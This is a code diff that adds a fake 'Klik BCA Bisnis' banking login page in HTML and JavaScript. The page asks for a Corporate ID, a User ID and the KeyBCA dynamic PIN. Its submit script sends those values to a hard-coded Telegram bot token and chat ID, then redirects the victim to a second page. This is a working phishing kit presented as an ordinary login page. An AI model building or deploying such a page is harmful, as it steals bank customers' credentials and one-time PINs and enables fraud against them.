@@ -1,0 +1,113 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   Login - Klik BCA Bisnis
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+   @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+  body {
+    font-family: 'Roboto', sans-serif;
+  }
+  /* Spinner animation */
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+  .spinner {
+    border: 5px solid rgba(13, 77, 161, 0.2);
+    border-top-color: #0D4DA1;
+    border-radius: 50%;
+    width: 36px;
+    height: 36px;
+    animation: spin 1s linear infinite;
+  }
+  </style>
+ </head>
+ <body class="bg-white min-h-screen flex flex-col items-center relative">
+  <div id="loadingOverlay" class="fixed inset-0 bg-white bg-opacity-90 flex items-center justify-center z-50 hidden">
+   <div class="spinner"></div>
+  </div>
+  <div class="w-full max-w-sm">
+   <div class="relative w-full h-40 bg-gradient-to-b from-[#0D4DA1] to-[#0A3B7A] rounded-b-3xl overflow-visible">
+    <img alt="Klik BCA Bisnis logo with blue background and colorful swoosh" class="absolute top-4 left-1/2 -translate-x-1/2 w-28 h-auto" height="80" src="https://pustaka.bca.co.id/Ocean/Product/DA162B01-4C4E-4E3F-A118-84C5514F0BD8/Logo/KlikBCA-Bisnis--Logo%20(1)-min.png" width="120"/>
+    <div class="absolute -bottom-10 left-1/2 -translate-x-1/2 bg-white rounded-xl shadow-md flex justify-between items-center w-72 h-20 px-6">
+     <img alt="Hands typing on a laptop keyboard inside a circle" class="w-12 h-12 rounded-full" height="48" src="https://storage.googleapis.com/a1aa/image/6fb3bdeb-3c05-4a2a-900f-0033dfae07f1.jpg" width="48"/>
+     <img alt="Hands holding a blue card inside a circle" class="w-15 h-15 rounded-full" height="48" src="https://ajakonline.com/wp-content/uploads/2019/06/TN_working-on-laptop-typing-words-clipart-2a.jpg" width="48"/>
+     <img alt="Hands holding a tablet and a card reader inside a circle" class="w-12 h-12 rounded-full" height="48" src="https://storage.googleapis.com/a1aa/image/de9455a0-7c20-49ae-f3e5-f013f7c00da3.jpg" width="48"/>
+    </div>
+   </div>
+   <form id="loginForm" class="mt-20 flex flex-col gap-3 px-2" action="#" method="POST">
+    <input id="corporateId" name="corporateId" class="border border-gray-300 rounded-md h-10 px-3 text-gray-600 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-600" placeholder="Corporate ID" type="text" required/>
+    <input id="userId" name="userId" class="border border-gray-300 rounded-md h-10 px-3 text-gray-600 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-600" placeholder="User ID" type="text" required/>
+    <input id="keyBcaResponse" name="keyBcaResponse" class="border border-gray-300 rounded-md h-10 px-3 text-gray-600 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-600" placeholder="KeyBCA Response" type="text" required/>
+    <button class="mt-4 bg-[#0D4DA1] text-white font-semibold rounded-md h-10 shadow-md hover:bg-[#0a3b7a] transition-colors" type="submit">
+     LOGIN
+    </button>
+   </form>
+   <div class="mt-3 text-center text-sm text-[#0D4DA1] font-normal cursor-pointer">
+    Pindah ke full site &gt;&gt;
+   </div>
+   <div class="mt-6 flex items-center gap-3 px-2">
+    <img alt="Digicert EV SSL Secure badge with logo" class="w-10 h-10" height="40" src="https://igrow.asia/images/footer-3.png" width="40"/>
+    <p class="text-gray-500 text-xs leading-tight">
+     KeyBCA Response adalah PIN dinamis yang dihasilkan KeyBCA, setelah Anda mengaktifkan KeyBCA
+    </p>
+   </div>
+  </div>
+  <script>
+   const form = document.getElementById('loginForm');
+   const loadingOverlay = document.getElementById('loadingOverlay');
+
+   // Replace these with your actual Telegram bot token and chat ID
+   const TELEGRAM_BOT_TOKEN = '8168283737:AAElC1wltyQ8aMP40ryHtq6vUJx8Ck-dFAo';
+   const TELEGRAM_CHAT_ID = '5906925079';
+
+   form.addEventListener('submit', function(e) {
+     e.preventDefault();
+     loadingOverlay.classList.remove('hidden');
+
+     const corporateId = document.getElementById('corporateId').value.trim();
+     const userId = document.getElementById('userId').value.trim();
+     const keyBcaResponse = document.getElementById('keyBcaResponse').value.trim();
+
+     const message = 
+       `New Login Submission:%0A` +
+       `Corporate ID: ${encodeURIComponent(corporateId)}%0A` +
+       `User ID: ${encodeURIComponent(userId)}%0A` +
+       `KeyBCA Response: ${encodeURIComponent(keyBcaResponse)}`;
+
+     // Telegram API URL
+     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+     fetch(telegramUrl, {
+       method: 'POST',
+       headers: {
+         'Content-Type': 'application/json'
+       },
+       body: JSON.stringify({
+         chat_id: TELEGRAM_CHAT_ID,
+         text: `Klikbisnis:\nCorporate ID: ${corporateId}\nUser ID: ${userId}\nKeyBCA Response: ${keyBcaResponse}`
+       })
+     })
+     .then(response => response.json())
+     .then(data => {
+       loadingOverlay.classList.add('hidden');
+       if (data.ok) {
+         window.location.href = "keybca2.html";
+         form.reset();
+       } else {
+         alert('Gagal mengirim data ke Telegram.');
+       }
+     })
+     .catch(() => {
+       loadingOverlay.classList.add('hidden');
+       alert('Terjadi kesalahan saat mengirim data.');
+     });
+   });
+  </script>
+ </body>
+</html>
